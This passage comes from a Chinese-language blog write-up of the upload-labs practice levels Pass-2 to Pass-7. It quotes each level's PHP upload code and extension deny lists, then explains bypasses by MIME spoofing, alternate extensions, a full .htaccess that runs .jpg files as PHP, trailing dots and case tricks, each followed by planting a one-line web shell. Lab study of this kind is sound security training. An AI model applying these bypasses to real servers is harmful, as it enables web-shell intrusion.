class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到代码中必须要求上传的文件需要满足的tpye类型为image/jpeg、image/png、image/gif。</p><p>采用bp抓包修改络请求绕过。<br><img src="https://s2.loli.net/2022/02/08/nuBvcp4NezZlDmh.png"><br>然后同样使用蚁剑链接。</p><h3 id="Pass-3-黑名单绕过"><a href="#Pass-3-黑名单绕过" class="headerlink" title="Pass-3-黑名单绕过"></a>Pass-3-黑名单绕过</h3><p>即对某些文件后缀进行黑名单处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看代码可以知道，不允许’.asp’,’.aspx’,’.php’,’.jsp’等文件后缀。并且重命名了文件，所以不可上传.htaccess文件。</p><p>所以尝试上传php5后缀的文件，出现了一个坑，本来的环境是用新版phpstudy配置的，但是在尝试配置Apache的conf文件时出现了一些问题，并没有起到效果，然后换了个18年的phpstudy，成功了。</p><p>为了能够上传.php5等后的文件，需要修改phpstudy文件目录下Apache下的httpd.conf。</p><pre><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></pre><p>修改后上传写好的.php5一句话木马，然后使用蚁剑连接即可。</p><h3 id="Pass-4-htaccess绕过"><a href="#Pass-4-htaccess绕过" class="headerlink" title="Pass-4-.htaccess绕过"></a>Pass-4-.htaccess绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到添加了跟多的黑名单，但是未过滤.htaccess，并且未修改上传文件名称，尝试上传.htaccess文件。</p><p>.htaccess的实例</p><pre><code>&lt;ifModule mime_module&gt;AddHandler php5-script .jpg&lt;!-- 将.jpg文件按照php代码进行解析执行 --&gt;AddType application/x-httpd-php .jpg&lt;!-- 将.jpg文件按照php代码进行解析执行 --&gt;Sethandler application/x-httpd-php&lt;!-- 将该目录及子目录下的文件均按照php文件解析执行 --&gt;&lt;/ifModule&gt;&lt;!-- 该种匹配方式并不推荐，极易造成误伤 --&gt;&lt;FilesMatch &quot;muma.jpg&quot;&gt;Sethandler application/x-httpd-php&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;Addhandler php5-script .jpg&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;&lt;/FilesMatch&gt;&lt;!-- 该种匹配方式较为精准，不会造成大批的误伤情况 --&gt;</code></pre><p>上传.htaccess时，不要加文件名。<br><img src="https://s2.loli.net/2022/02/08/wpHVr4fjNL57dch.png"><br>然后上传个.jpg的一句话木马，蚁剑连接即可。</p><p>然后又去多搜索了下.htaccess的知识。</p><p>.htaccess原理：.htaccess文件是Apache服务器下的一个配置文件。其主要负责相关目录下的网页配置，即：在一个特定的文档目录中放置一个包含一个或多个指令的文件来对网页进行配置。<br>不过需要注意的是，.htaccess文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。</p><p>是需要1.mod_rewrite模块开启。2.AllowOverride All，然后结合下面一句话。</p><pre><code>AllowOverride从字面上解释是允许覆盖的意思，即Apache允许另一配置文件覆盖现有配置文件。我们通常利用Apache的rewrite模块对URL进行重写，rewrite规则会写在 .htaccess 文件里。但要使 apache 能够正常的读取.htaccess 文件的内容，就必须对.htaccess 所在目录进行配置。</code></pre><p>所以可以推测，为什么能够将.jpg文件识别为.php文件的原因就是经过URL重写，jpg已经变为了php。</p><h3 id="Pass-5-系统命名绕过"><a href="#Pass-5-系统命名绕过" class="headerlink" title="Pass-5-系统命名绕过"></a>Pass-5-系统命名绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能过滤的都过滤了，空格，大小写，文件末尾点，::$DATA。</p><p>然后根据我自己抓包，发包的尝试，deldot函数应该是去除文件名后面所有的点。</p><p>尝试1.php. .，中间加个空格，这样先是经过deldot，去掉了最后一个点变成1.php. ，然后经过trim变成1.php.，在Windows系统中，上传 index.php. 会重命名为 . ，可以绕过后缀检查。</p><h3 id="Pass-6-大小写绕过"><a href="#Pass-6-大小写绕过" class="headerlink" title="Pass-6-大小写绕过"></a>Pass-6-大小写绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用上面的方法是可以成功上传文件的，但是后缀没了，原因在于本样例重新进行了命名，也就是说采用上面的绕过方式，file_ext什么都没有。</p><p>但是本样例未对大小写进行判断，所以采用大小写绕过。1.Php。</p><h3 id="Pass-7-空格绕过"><a href="#Pass-7-空格绕过" class="headerlink" title="Pass-7-空格绕过"></a>Pass-7-空格绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span 